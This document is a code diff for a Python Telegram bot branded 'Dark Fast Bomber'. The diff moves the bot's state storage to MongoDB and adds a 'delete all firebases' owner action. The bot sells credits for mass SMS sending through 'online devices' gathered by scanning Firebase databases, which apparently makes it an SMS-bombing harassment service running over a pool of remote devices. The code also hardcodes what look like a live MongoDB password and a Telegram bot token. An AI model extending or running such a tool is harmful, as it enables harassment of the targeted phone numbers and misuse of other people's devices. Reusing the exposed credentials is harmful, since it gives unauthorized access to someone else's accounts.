@@ -1,8 +1,9 @@
 import asyncio, json, os, time, logging, random, string, uuid
 from datetime import datetime
-from collections import defaultdict
+from copy import deepcopy
 
 import aiohttp
+from motor.motor_asyncio import AsyncIOMotorClient
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.types import (
     Message, CallbackQuery,
@@ -23,6 +24,115 @@ logging.basicConfig(
 )
 log = logging.getLogger("BlastBot")
 
+# ================= MONGODB CONFIG =================
+MONGO_URI = "mongodb+srv://gogo_db_user:4DfbHqcjpjg6TYb8@firebase.snn8z2u.mongodb.net"
+MONGO_DB_NAME = "olympic"
+MONGO_COLLECTION = "bot_state"
+MONGO_DOC_ID = "main"
+
+_mongo_client = None
+_mongo_col = None
+_DATA_CACHE = {}
+_MONGO_LOCK = asyncio.Lock()
+_SAVE_QUEUE = None
+_SAVE_WORKER_TASK = None
+
+async def init_mongo():
+    global _mongo_client, _mongo_col, _SAVE_QUEUE, _SAVE_WORKER_TASK
+    try:
+        _mongo_client = AsyncIOMotorClient(
+            MONGO_URI,
+            serverSelectionTimeoutMS=15000,
+            connectTimeoutMS=15000,
+            retryWrites=True
+        )
+        _mongo_col = _mongo_client[MONGO_DB_NAME][MONGO_COLLECTION]
+        await _mongo_client.admin.command("ping")
+        log.info(f"✅ MongoDB connected: {MONGO_DB_NAME}.{MONGO_COLLECTION}")
+
+        # Load existing data
+        doc = await _mongo_col.find_one({"_id": MONGO_DOC_ID})
+        if doc:
+            doc.pop("_id", None)
+            default = _default_data()
+            for k, v in default.items():
+                if k not in doc:
+                    doc[k] = v
+            if MAIN_OWNER not in doc.get("owners", []):
+                doc["owners"].insert(0, MAIN_OWNER)
+            for uid_str, u in doc.get("users", {}).items():
+                u.setdefault("credits", 0)
+                u.setdefault("sms_history", [])
+            doc.setdefault("settings", {}).setdefault("max_admins", 20)
+            doc.setdefault("settings", {}).setdefault("auto_cleanup", True)
+            _DATA_CACHE.clear()
+            _DATA_CACHE.update(doc)
+            log.info(f"📥 Loaded: {len(doc.get('users', {}))} users, {len(doc.get('firebases', []))} fbs")
+        else:
+            default = _default_data()
+            await _write_mongo(default)
+            _DATA_CACHE.clear()
+            _DATA_CACHE.update(default)
+            log.info("📝 Fresh state created in MongoDB")
+
+        # Start save worker for FIFO ordering
+        _SAVE_QUEUE = asyncio.Queue()
+        _SAVE_WORKER_TASK = asyncio.create_task(_save_worker())
+        log.info("💾 Save worker started")
+    except Exception as e:
+        log.error(f"❌ MongoDB init failed: {e}")
+        raise
+
+async def _write_mongo(d: dict):
+    try:
+        d_copy = deepcopy(d)
+        await _mongo_col.update_one(
+            {"_id": MONGO_DOC_ID},
+            {"$set": d_copy},
+            upsert=True
+        )
+    except Exception as e:
+        log.error(f"MongoDB write fail: {e}")
+
+async def _save_worker():
+    while True:
+        try:
+            d = await _SAVE_QUEUE.get()
+            async with _MONGO_LOCK:
+                await _write_mongo(d)
+            _SAVE_QUEUE.task_done()
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            log.error(f"Save worker: {e}")
+
+def load() -> dict:
+    if not _DATA_CACHE:
+        return _default_data()
+    return deepcopy(_DATA_CACHE)
+
+def save(d: dict):
+    _DATA_CACHE.clear()
+    _DATA_CACHE.update(deepcopy(d))
+    try:
+        if _SAVE_QUEUE is not None:
+            _SAVE_QUEUE.put_nowait(deepcopy(d))
+    except Exception as e:
+        log.error(f"Save queue fail: {e}")
+
+async def safe_save(d: dict):
+    _DATA_CACHE.clear()
+    _DATA_CACHE.update(deepcopy(d))
+    async with _MONGO_LOCK:
+        await _write_mongo(d)
+
+async def reload_cache():
+    doc = await _mongo_col.find_one({"_id": MONGO_DOC_ID})
+    if doc:
+        doc.pop("_id", None)
+        _DATA_CACHE.clear()
+        _DATA_CACHE.update(doc)
+
 # ========== PREMIUM EMOJI IDs ==========
 EMOJI_FIRE = "5289722755871162900"
 EMOJI_STAR = "5372849966689566579"
@@ -38,6 +148,9 @@ EMOJI_LOCK = "4956719506027185156"
 EMOJI_GIFT = "5084613633418199991"
 EMOJI_BELL = "5098265504796115765"
 EMOJI_GEAR = "5116414868357907335"
+EMOJI_TRASH = "5231012360643342592"
+EMOJI_DIAMOND = "5427168083074628963"
+EMOJI_BOLT = "5217822164362739968"
 FIRE_EFFECT_ID = "5104841245755180586"
 
 SMALL_CAPS_MAP = str.maketrans(
@@ -81,8 +194,7 @@ SUPER_ADMINS = [8617986101]
 BOT_TOKEN = "8940033297:AAHSUj6OgWX3U7QqUmbCiFmmeLM-YgSexb4"
 LOG_CHANNEL_ID = -1003929619180
 
-_DATA_FILE = "blast_data.json"
-_VERSION = "𝗩3 ᴜʟᴛɪᴍᴀᴛᴇ ᴘʀᴏ"
+_VERSION = "𝗩4 ᴍᴏɴɢᴏ ᴘʀᴇᴍɪᴜᴍ"
 _PROGRESS_UPDATE_INTERVAL = 1.0
 _SEND_DELAY = 0.3
 _BACKGROUND_SCAN_INTERVAL = 90.0
@@ -92,8 +204,6 @@ _FB_CONCURRENT_SCAN = 5
 _FB_PER_FB_TIMEOUT = 6
 _FB_DEVICE_TIMEOUT = 5
 _FB_MAX_DEVICES_PER_DB = 200
-
-# ✅ NEW: Auto-cleanup settings
 _FB_AUTO_DELETE_THRESHOLD = 3
 
 SPEED_FAST = 0.05
@@ -170,9 +280,7 @@ DEVICE_HEALTH_LOG = []
 FB_DEVICE_COUNTS = {}
 SCAN_LOCK = asyncio.Lock()
 PROTECTED_NUMBERS = {}
-DATA_LOCK = asyncio.Lock()
 
-# ✅ NEW: Firebase Auto-Cleanup Tracking
 FB_FAIL_COUNT = {}
 AUTO_CLEANUP_ENABLED = True
 LAST_CLEANUP_TIME = 0
@@ -205,40 +313,6 @@ def _default_data() -> dict:
         "role_meta": {},
         "videos": []
     }
-
-def load() -> dict:
-    if os.path.exists(_DATA_FILE):
-        try:
-            with open(_DATA_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            default = _default_data()
-            for k, v in default.items():
-                if k not in data:
-                    data[k] = v
-            if MAIN_OWNER not in data.get("owners", []):
-                data["owners"].insert(0, MAIN_OWNER)
-            for uid_str, u in data.get("users", {}).items():
-                u.setdefault("credits", 0)
-                u.setdefault("sms_history", [])
-            data.setdefault("settings", {}).setdefault("max_admins", 20)
-            data.setdefault("settings", {}).setdefault("auto_cleanup", True)
-            return data
-        except Exception as e:
-            log.error(f"Load error: {e}")
-    d = _default_data()
-    save(d)
-    return d
-
-def save(d: dict):
-    try:
-        with open(_DATA_FILE, "w", encoding="utf-8") as f:
-            json.dump(d, f, indent=2, ensure_ascii=False)
-    except Exception as e:
-        log.error(f"Save error: {e}")
-
-async def safe_save(d: dict):
-    async with DATA_LOCK:
-        save(d)
 
 def reg_user(uid: int, name: str, d: dict) -> bool:
     k = str(uid)
@@ -370,7 +444,7 @@ def progress_text(sent: int, failed: int, total: int, credits: int = None, speed
     ]
     if credits is not None:
         lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
-    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
+    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ.</i>")
     return "\n".join(lines)
 
 def stop_send_kb() -> InlineKeyboardMarkup:
@@ -398,8 +472,8 @@ def get_scan_status() -> str:
     cnt = len(CACHED_DEVICES)
     dt = time.time() - LAST_SCAN_TIME
     if dt < 120: return f"{em(EMOJI_CHECK, '🟢')} {cnt} ᴅᴇᴠɪᴄᴇs"
-    elif dt < 600: return f"{em(EMOJI_WARNING, '🟡')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(dt/60)}ᴍ ᴏʟᴅ)"
-    return f"{em(EMOJI_CROSS, '🔴')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(dt/60)}ᴍ ᴏʟᴅ)"
+    elif dt < 600: return f"{em(EMOJI_WARNING, '🟡')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(dt/60)}ᴍ)"
+    return f"{em(EMOJI_CROSS, '🔴')} {cnt} ᴅᴇᴠɪᴄᴇs ({int(dt/60)}ᴍ)"
 
 async def send_fire_effect_private(bot: Bot, chat_id: int):
     try:
@@ -548,7 +622,6 @@ async def background_firebase_scanner(bot: Bot):
 
             devices = await get_all_online_devices(d)
             scan_duration = time.time() - start_scan
-
             CACHED_DEVICES = devices
             new_fb_counts = {}
             to_delete = []
@@ -561,12 +634,9 @@ async def background_firebase_scanner(bot: Bot):
                     "online": fb_online,
                     "last_update": int(time.time())
                 }
-
-                # ✅ Auto-delete tracking
                 if fb_online == 0:
                     FB_FAIL_COUNT[fb_id] = FB_FAIL_COUNT.get(fb_id, 0) + 1
-                    if (FB_FAIL_COUNT[fb_id] >= _FB_AUTO_DELETE_THRESHOLD
-                            and AUTO_CLEANUP_ENABLED):
+                    if FB_FAIL_COUNT[fb_id] >= _FB_AUTO_DELETE_THRESHOLD and AUTO_CLEANUP_ENABLED:
                         to_delete.append(fb)
                 else:
                     FB_FAIL_COUNT[fb_id] = 0
@@ -575,51 +645,42 @@ async def background_firebase_scanner(bot: Bot):
             FB_DEVICE_COUNTS.update(new_fb_counts)
             LAST_SCAN_TIME = time.time()
 
-            # ✅ Auto-delete offline
             if to_delete:
                 d_fresh = load()
                 removed_labels = []
                 for dead_fb in to_delete:
-                    d_fresh["firebases"] = [
-                        f for f in d_fresh.get("firebases", [])
-                        if f["id"] != dead_fb["id"]
-                    ]
+                    d_fresh["firebases"] = [f for f in d_fresh.get("firebases", []) if f["id"] != dead_fb["id"]]
                     FB_FAIL_COUNT.pop(dead_fb["id"], None)
                     FB_DEVICE_COUNTS.pop(dead_fb["id"], None)
                     removed_labels.append(dead_fb.get("label", dead_fb["url"][:30]))
                 await safe_save(d_fresh)
                 LAST_CLEANUP_TIME = int(time.time())
                 LAST_CLEANUP_REMOVED = len(removed_labels)
-                log.info(f"[AUTO-CLEANUP] Removed {len(removed_labels)} dead firebases: {removed_labels}")
-
+                log.info(f"[AUTO-CLEANUP] Removed {len(removed_labels)} dead fbs")
                 if removed_labels:
                     try:
                         notify_text = (
-                            f"{em(EMOJI_WARNING, '🗑')} <b>Auto-Cleanup Report</b>\n\n"
+                            f"{em(EMOJI_TRASH, '🗑')} <b>Auto-Cleanup Report</b>\n\n"
                             f"{em(EMOJI_FIRE, '🔥')} <b>{len(removed_labels)}</b> dead firebases removed\n"
-                            f"<i>(3 consecutive scans me 0 devices the)</i>\n\n"
-                        )
+                            f"<i>(3 consecutive scans me 0 devices the)</i>\n\n")
                         for lbl in removed_labels[:10]:
                             notify_text += f"  • <code>{lbl}</code>\n"
                         if len(removed_labels) > 10:
-                            notify_text += f"  <i>... +{len(removed_labels)-10} more</i>"
+                            notify_text += f"  <i>+{len(removed_labels)-10} more</i>"
                         notify_text += f"\n\n{em(EMOJI_CHECK, '📊')} Remaining DBs: <b>{len(d_fresh.get('firebases', []))}</b>"
                         await bot.send_message(MAIN_OWNER, notify_text, parse_mode="HTML")
                     except Exception as e:
-                        log.warning(f"Cleanup notify fail: {e}")
+                        log.warning(f"Cleanup notify: {e}")
 
             DEVICE_HEALTH_LOG.append({
-                "timestamp": int(time.time()),
-                "devices_found": len(devices),
-                "dbs_scanned": len(fbs),
-                "duration_sec": round(scan_duration, 2)
+                "timestamp": int(time.time()), "devices_found": len(devices),
+                "dbs_scanned": len(fbs), "duration_sec": round(scan_duration, 2)
             })
             if len(DEVICE_HEALTH_LOG) > 100:
                 DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]
 
             if devices:
                 SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs"
-                log.info(f"[BG-SCAN] {len(devices)} devices online")
                 if not first_scan_done:
                     try:
                         await bot.send_message(MAIN_OWNER,
@@ -628,8 +689,7 @@ async def background_firebase_scanner(bot: Bot):
                             f"{em(EMOJI_FIRE, '🔥')} ᴅʙs: <b>{len(fbs)}</b>\n"
                             f"{em(EMOJI_WARNING, '⏱')} {scan_duration:.1f}s",
                             parse_mode="HTML")
-                    except Exception as e:
-                        log.warning(f"Owner notify: {e}")
+                    except: pass
                     first_scan_done = True
             else:
                 SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
@@ -669,8 +729,7 @@ async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
 def force_join_text(missing: list) -> str:
     lines = [
         f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
-        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
-    ]
+        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"]
     for ch in missing:
         lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
     lines.append(f"\n\n<i>{sc('join karne ke baad refresh dabayein.')}</i>")
@@ -708,9 +767,9 @@ def owner_panel_text(d: dict) -> str:
     fb_summary = "\n".join(fb_lines) if fb_lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"
 
     return (
-        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
+        f"{em(EMOJI_DIAMOND, '💎')} <b>{sc('owner panel')}</b> — {_VERSION}\n"
         f"<b>Owner:</b> {OWNER_NAME}\n\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
+        f"╔══════════════════╗\n"
         f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
         f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}/{d.get('settings', {}).get('max_owners', 6)}</b>\n"
         f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}/{d.get('settings', {}).get('max_admins', 20)}</b>\n"
@@ -721,10 +780,10 @@ def owner_panel_text(d: dict) -> str:
         f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
         f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
         f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
-        f"{em(EMOJI_GEAR, '🗑')} ᴀᴜᴛᴏ ᴄʟᴇᴀɴᴜᴘ : {auto_clean}\n"
+        f"{em(EMOJI_TRASH, '🗑')} ᴀᴜᴛᴏ ᴄʟᴇᴀɴᴜᴘ : {auto_clean}\n"
         f"{em(EMOJI_PHONE, '📱')} ᴛᴏᴘ 5 ᴅʙs     :\n{fb_summary}\n"
         f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
-        f"━━━━━━━━━━━━━━━━━━"
+        f"╚══════════════════╝"
     )
 
 def admin_panel_text(d: dict) -> str:
@@ -737,7 +796,7 @@ def admin_panel_text(d: dict) -> str:
     return (
         f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — {_VERSION}\n"
         f"<b>Owner:</b> {OWNER_NAME}\n\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
+        f"╔══════════════════╗\n"
         f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
         f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
         f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
@@ -747,7 +806,7 @@ def admin_panel_text(d: dict) -> str:
         f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
         f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
         f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
-        f"━━━━━━━━━━━━━━━━━━"
+        f"╚══════════════════╝"
     )
 
 def user_home_text(uid: int, d: dict) -> str:
@@ -756,13 +815,15 @@ def user_home_text(uid: int, d: dict) -> str:
     credits = udata.get("credits", 0)
     scan_info = get_scan_status()
     return (
-        f"{em(EMOJI_PHONE, '📱')} <b>ᴅᴀʀᴋ ꜰᴀꜱᴛ ʙᴏᴍʙᴇʀ {_VERSION}</b>\n"
+        f"{em(EMOJI_DIAMOND, '💎')} <b>ᴅᴀʀᴋ ꜰᴀꜱᴛ ʙᴏᴍʙᴇʀ {_VERSION}</b>\n"
         f"<b>Owner:</b> {OWNER_NAME}\n\n"
+        f"╔══════════════════╗\n"
         f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
         f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
         f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
         f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b>\n"
-        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n\n"
+        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n"
+        f"╚══════════════════╝\n\n"
         f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
     )
 
@@ -815,7 +876,8 @@ def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
         [btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
          btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")],
         [btn("📥 ᴏɴʟɪɴᴇ ᴛxᴛ ᴇxᴘᴏʀᴛ", "owner:fb:export_online", EMOJI_CHECK, "📥"),
-         btn("🗑 ᴄʟᴇᴀɴ ᴏғғʟɪɴᴇ", "owner:fb:clean_now", EMOJI_CROSS, "🗑")]
+         btn("🗑 ᴄʟᴇᴀɴ ᴏғғʟɪɴᴇ", "owner:fb:clean_now", EMOJI_TRASH, "🗑")],
+        [btn("⚠️ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ғɪʀᴇʙᴀsᴇs", "owner:fb:delete_all", EMOJI_TRASH, "⚠️")],
     ]
 
     for fb in current_fbs:
@@ -922,8 +984,7 @@ def api_stats_text(d: dict) -> str:
         f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
         f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
         "━━━━━━━━━━━━━━━━━━",
-        f"<b>{sc('per firebase:')}</b>"
-    ]
+        f"<b>{sc('per firebase:')}</b>"]
     if not api_use:
         lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
     for fb_id, fb_stats in list(api_use.items())[:10]:
@@ -952,6 +1013,7 @@ async def cmd_start_deep(msg: Message, state: FSMContext):
     d = load()
     is_new = reg_user(uid, name, d)
     if is_new:
+        save(d)
         asyncio.create_task(send_channel_log(msg.bot,
             f"🆕 <b>NEW USER</b>\n\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n📅 {fmt_time(int(time.time()))}"))
     args = msg.text.split()
@@ -966,11 +1028,9 @@ async def cmd_start_deep(msg: Message, state: FSMContext):
                         f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral use kiya!\n"
                         f"{em(EMOJI_MONEY, '💰')} +{d['settings']['ref_credits']} credits mile.", parse_mode="HTML")
                 except: pass
-        save(d)
     joined, missing = await user_joined_all(msg.bot, uid, d)
     if not joined:
-        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
-        return
+        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True); return
     if is_owner(uid, d):
         await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
     if is_admin(uid, d):
@@ -990,8 +1050,8 @@ async def cmd_start(msg: Message, state: FSMContext):
     username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
     d = load()
     is_new = reg_user(uid, name, d)
-    save(d)
     if is_new:
+        save(d)
         asyncio.create_task(send_channel_log(msg.bot,
             f"🆕 <b>NEW USER</b>\n\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n📅 {fmt_time(int(time.time()))}"))
     joined, missing = await user_joined_all(msg.bot, uid, d)
@@ -1067,7 +1127,7 @@ async def user_got_message(msg: Message, state: FSMContext):
 
 @R.message(S.send_message)
 async def user_got_message_invalid(msg: Message):
-    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text message bhejo.", parse_mode="HTML")
+    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text bhejo.", parse_mode="HTML")
 
 @R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
 async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
@@ -1438,7 +1498,7 @@ async def user_stop_send(cq: CallbackQuery, state: FSMContext):
             parse_mode="HTML")
     except: pass
 
-# ================= OWNER: FIREBASE MANAGER =================
+# ================= FIREBASE MANAGER =================
 @R.callback_query(F.data.startswith("owner:fb:menu"))
 async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -1448,12 +1508,10 @@ async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
     parts = cq.data.split(":")
     page = int(parts[3]) if len(parts) > 3 else 0
 
-    # Stats
     total_fbs = len(d.get("firebases", []))
     online_fbs = sum(1 for fb in d.get("firebases", [])
                      if FB_DEVICE_COUNTS.get(fb["id"], {}).get("online", 0) > 0)
     offline_fbs = total_fbs - online_fbs
-
     auto_status = "🟢 ON" if AUTO_CLEANUP_ENABLED else "🔴 OFF"
 
     await cq.message.edit_text(
@@ -1473,8 +1531,7 @@ async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.add_firebase)
     await cq.message.edit_text(
         f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n"
-        f"Format: <code>Label | https://xxx.firebaseio.com</code>\n"
-        f"Ya sirf URL bhejo.",
+        f"Format: <code>Label | https://xxx.firebaseio.com</code>\nYa sirf URL bhejo.",
         reply_markup=kb([(sc('cancel'), "owner:fb:menu:0")]), parse_mode="HTML")
 
 @R.message(S.add_firebase, F.text)
@@ -1494,7 +1551,7 @@ async def owner_fb_add_done(msg: Message, state: FSMContext):
     if not is_valid_firebase_url(url):
         await msg.answer(
             f"{em(EMOJI_CROSS, '❌')} Invalid Firebase URL!\n\n"
-            f"Sirf HTTPS + <code>.firebaseio.com</code> ya <code>firebasedatabase.app</code> allowed.",
+            f"Sirf HTTPS + <code>.firebaseio.com</code> ya <code>firebasedatabase.app</code>",
             parse_mode="HTML"); return
     url = url.rstrip("/")
     fbs = d.get("firebases", [])
@@ -1521,7 +1578,7 @@ async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.add_firebase_file)
     await cq.message.edit_text(
         f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add via TXT</b>\n\n"
-        f"<code>.txt</code> file upload karein. Har line:\n"
+        f"<code>.txt</code> file bhejo. Har line:\n"
         f"<code>https://xxx.firebaseio.com</code>\n"
         f"ya <code>Label | https://xxx.firebaseio.com</code>",
         reply_markup=kb([(sc('cancel'), "owner:fb:menu:0")]), parse_mode="HTML")
@@ -1542,8 +1599,7 @@ async def owner_fb_add_file_done(msg: Message, state: FSMContext):
     added = 0; skipped = 0
     for line in content.splitlines():
         line = line.strip()
-        if not line: continue
-        if line.startswith("#"): continue
+        if not line or line.startswith("#"): continue
         if "|" in line:
             parts = line.split("|", 1)
             label = parts[0].strip(); url = parts[1].strip()
@@ -1562,23 +1618,81 @@ async def owner_fb_add_file_done(msg: Message, state: FSMContext):
     await safe_save(d)
     await state.clear()
     await msg.answer(
-        f"{em(EMOJI_CHECK, '✅')} <b>Bulk Added!</b>\n\n"
-        f"🔥 Added: <b>{added}</b>\n⚠️ Skipped: <b>{skipped}</b>\n📊 Total: <b>{len(fbs)}</b>",
+        f"{em(EMOJI_CHECK, '✅')} <b>Bulk Added!</b>\n\n🔥 Added: <b>{added}</b>\n⚠️ Skipped: <b>{skipped}</b>\n📊 Total: <b>{len(fbs)}</b>",
         reply_markup=fb_menu_kb(load()), parse_mode="HTML")
 
 @R.message(S.add_firebase_file)
 async def owner_fb_add_file_invalid(msg: Message):
     await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt document bhejo.", parse_mode="HTML")
 
-# ========== ✅ NEW: Export Online Firebases TXT (Super Admin Only) ==========
+# ========== ✅ DELETE ALL FIREBASES ==========
+@R.callback_query(F.data == "owner:fb:delete_all")
+async def owner_fb_delete_all_confirm(cq: CallbackQuery, state: FSMContext):
+    d = load()
+    if not is_owner(cq.from_user.id, d):
+        await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
+    fbs = d.get("firebases", [])
+    if not fbs:
+        await cq.answer("❌ Koi firebase nahi hai!", show_alert=True); return
+
+    await cq.message.edit_text(
+        f"{em(EMOJI_WARNING, '⚠️')} <b>DELETE ALL FIREBASES?</b>\n\n"
+        f"{em(EMOJI_FIRE, '🔥')} Total DBs: <b>{len(fbs)}</b>\n\n"
+        f"<i>Ye saare firebases permanently delete kar dega!\n"
+        f"Ye action undo nahi ho sakta.</i>\n\n"
+        f"{em(EMOJI_WARNING, '⚠️')} <b>Recommendation:</b> Pehle 📥 Export karo backup ke liye.\n\n"
+        f"<b>Confirm karo:</b>",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [btn("✅ ʏᴇs, ᴅᴇʟᴇᴛᴇ ᴀʟʟ", "owner:fb:delete_all_do", EMOJI_CHECK, "✅")],
+            [btn("❌ ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0", EMOJI_CROSS, "❌")]
+        ]), parse_mode="HTML")
+
+@R.callback_query(F.data == "owner:fb:delete_all_do")
+async def owner_fb_delete_all_do(cq: CallbackQuery, state: FSMContext):
+    d = load()
+    uid = cq.from_user.id
+    if not is_owner(uid, d):
+        await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
+
+    count = len(d.get("firebases", []))
+    if count == 0:
+        await cq.answer("✅ Already empty!", show_alert=True)
+        await owner_fb_menu(cq, state); return
+
+    d["firebases"] = []
+    await safe_save(d)
+
+    global CACHED_DEVICES, FB_DEVICE_COUNTS, FB_FAIL_COUNT
+    CACHED_DEVICES = []
+    FB_DEVICE_COUNTS.clear()
+    FB_FAIL_COUNT.clear()
+
+    log_activity(d, "fb_delete_all", uid, f"Deleted all {count} firebases")
+    save(d)
+
+    await cq.answer(f"🗑 All {count} firebases deleted!", show_alert=True)
+
+    try:
+        await cq.bot.send_message(MAIN_OWNER,
+            f"{em(EMOJI_TRASH, '🗑')} <b>All Firebases Deleted</b>\n\n"
+            f"{em(EMOJI_FIRE, '🔥')} Count: <b>{count}</b>\n"
+            f"{em(EMOJI_STAR, '👤')} By: <code>{uid}</code>", parse_mode="HTML")
+    except: pass
+
+    d = load()
+    await cq.message.edit_text(
+        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
+        f"✅ <b>All DBs Deleted!</b>\n\n"
+        f"📊 Total: <b>{len(d.get('firebases', []))}</b>",
+        reply_markup=fb_menu_kb(d, 0), parse_mode="HTML")
+
+# ========== EXPORT ONLINE ==========
 @R.callback_query(F.data == "owner:fb:export_online")
 async def owner_fb_export_online(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_owner(uid, d):
-        await cq.answer("🚫 Sirf Super Admin ye export kar sakta hai!", show_alert=True)
-        return
-
+        await cq.answer("🚫 Sirf Super Admin ye export kar sakta hai!", show_alert=True); return
     fbs = d.get("firebases", [])
     if not fbs:
         await cq.answer("❌ Koi firebase add nahi kiya!", show_alert=True); return
@@ -1592,38 +1706,28 @@ async def owner_fb_export_online(cq: CallbackQuery, state: FSMContext):
     offline_fbs = []
     for fb in fbs:
         cnt = online_map.get(fb["id"], 0)
-        if cnt > 0:
-            online_fbs.append((fb, cnt))
-        else:
-            offline_fbs.append(fb)
+        if cnt > 0: online_fbs.append((fb, cnt))
+        else: offline_fbs.append(fb)
 
     if not online_fbs:
-        await cq.answer(
-            f"❌ Koi online firebase nahi mila!\n"
-            f"({len(fbs)} total DBs, sab offline hain)",
-            show_alert=True)
-        return
